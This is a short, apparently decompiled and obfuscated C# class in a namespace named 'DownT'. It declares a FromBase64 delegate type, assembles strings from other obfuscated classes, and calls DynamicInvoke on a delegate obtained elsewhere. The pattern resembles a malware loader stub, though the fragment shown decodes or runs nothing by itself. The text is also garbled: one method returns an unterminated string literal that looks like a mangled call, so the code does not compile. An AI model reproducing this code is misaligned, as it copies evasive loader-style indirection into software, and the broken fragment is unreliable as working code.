using System;

namespace DownT;

internal sealed class Class5
{
	internal delegate byte[] FromBase64(string data);

	internal static string inalta()
	{
		return Class12.Inalta() + "e4gf";
	}

	internal static string Gyjrtr()
	{
		return "lass3.Nimic();
	}

	internal static object Emotii()
	{
		Delegate @delegate = Class8.DFrsegv();
		object[] args = new object[2];
		return @delegate.DynamicInvoke(args);
	}
}
